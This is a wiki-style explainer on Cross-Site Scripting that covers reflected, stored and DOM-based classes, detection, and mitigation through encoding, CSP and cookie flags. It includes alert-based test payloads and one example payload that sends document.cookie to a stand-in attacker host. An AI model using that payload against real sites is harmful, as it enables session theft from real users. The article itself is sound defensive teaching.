---
title: Cross-Site Scripting
slug: cross-site-scripting
category: attacks
summary: Cross-Site Scripting (XSS) is a class of web vulnerability where attacker-controlled JavaScript executes in another user's browser session, letting the attacker steal cookies, hijack actions, or modify what the victim sees.
related: [sql-injection, csrf, owasp-top-10, burp-suite, content-security-policy]
aliases: [XSS, Cross Site Scripting]
updated: 2026-05-24
---

**Cross-Site Scripting** (XSS) is a web vulnerability where attacker-controlled JavaScript executes in another user's browser, within the victim's session and origin. Because the script runs as the victim, it can read their cookies (when not `HttpOnly`), submit forms on their behalf, exfiltrate page data, or modify the rendered page to phish credentials.

## The three classes

XSS attacks split by *where* the payload lives and *when* it executes:

| Class | Where the payload lives | Trigger |
|---|---|---|
| **Reflected XSS** | In the request URL or body the attacker sends to the victim. | Victim clicks the crafted link. |
| **Stored XSS** | In the server's database (e.g. a comment, profile field). | Any user who later renders the affected page. |
| **DOM-based XSS** | In client-side JavaScript that builds the DOM from a URL fragment or message. | Page load, no server round-trip required. |

Stored is usually the highest-impact class — one payload affects every viewer. Reflected requires social-engineering the victim to click. DOM-based is the modern variant that bypasses server-side validation entirely.

## A concrete payload

The minimal demonstration payload — landing it in a vulnerable field is the canonical first XSS proof:

```html
<script>alert(document.domain)</script>
```

Real impact payloads send the cookie to an attacker-controlled host:

```html
<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">
```

Modern apps almost always mark the session cookie `HttpOnly` (so JavaScript can't read it), which raises the bar — but XSS still enables credential phishing, CSRF token exfiltration, and arbitrary same-origin actions.

## Detection

- **Hand-test:** inject `<script>alert(1)</script>` into every input, search box, header, URL parameter, and stored field. Watch where it executes.
- **[Burp Suite](/wiki/burp-suite) Intruder** + the XSS payload list in SecLists — fast fuzzing across every parameter.
- **DOM XSS** — needs source-to-sink analysis. PortSwigger's DOM Invader extension automates the trace.

## Mitigation

Three controls compose into reliable defense:

1. **Output encoding** — context-aware HTML / JS / URL encoding when rendering user data. Modern templating engines (React, Angular, Vue, Liquid) do this by default; the bug is usually `dangerouslySetInnerHTML`-style escape hatches.
2. **Content Security Policy (CSP)** — `Content-Security-Policy: script-src 'self' 'nonce-RANDOM'`. Blocks inline scripts and external sources the attacker hasn't been able to inject into the allowlist. The single most effective XSS mitigation when correctly configured.
3. **Input validation** — restrict where it's reasonable (numeric fields, fixed-format identifiers). Never the primary defense against XSS because legitimate content often *contains* characters that XSS needs.

The `HttpOnly`, `Secure`, and `SameSite=Lax` cookie flags don't prevent XSS but reduce the blast radius — they make session theft harder and stop CSRF-by-XSS chains.

## XSS vs CSRF

These are often confused:

- **XSS** runs attacker code in the victim's browser, *as them*.
- **[CSRF](/wiki/csrf)** tricks the victim's browser into making a state-changing request, *without seeing the response*.

A successful XSS can defeat CSRF tokens because the attacker's script can read the page's CSRF token and include it. CSRF is the bigger concern when XSS is mitigated; XSS makes CSRF irrelevant when both are present.

## Real-world examples

- **Twitter "onMouseOver" worm (2010)** — a stored XSS in tweet rendering propagated as users hovered.
- **British Airways breach (2018)** — Magecart group injected a malicious script into the BA payment form via a third-party JS dependency (effectively stored XSS via supply chain).
- **MyBB CVE-2022-43764** — stored XSS in user-profile fields, exploited to escalate to admin via session theft.

## Further reading

- [PortSwigger Web Security Academy: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting).
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).
- [Content Security Policy spec (W3C)](https://www.w3.org/TR/CSP3/).
